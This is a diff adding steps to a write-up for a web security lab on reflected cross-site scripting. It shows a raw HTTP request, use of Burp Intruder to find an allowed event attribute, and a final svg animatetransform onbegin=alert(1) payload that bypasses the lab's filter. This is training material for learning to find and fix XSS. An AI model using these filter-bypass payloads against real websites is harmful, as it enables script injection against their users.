@@ -255,7 +255,37 @@ You Have a Search Funtion and search like asif and intercept the request and san
   
  ## svg, animatetransform, title, and image tags 200 OKK
   
-  
+ Go back to the Positions tab in Burp Intruder and replace your search term with: 
+ 
+    <svg><animatetransform%20§§=1>
+    
+ ## replace 
+ 
+    GET /?search=<svg><animatetransform%20§§=1> HTTP/1.1
+    Host: 0a130031045b2eeac06b090600110008.web-security-academy.net
+    Cookie: session=Xvy6OLwWRumjRFxHQqruIfV77mnV5YmN
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: https://0a130031045b2eeac06b090600110008.web-security-academy.net/
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
+    
+ Visit the XSS cheat sheet and click "Copy events to clipboard". 
+ 
+ In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
+ 
+ When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onbegin payload, which caused a 200 response. 
+ 
+ Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved:
+ 
+    exmple.com/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
   
   
   
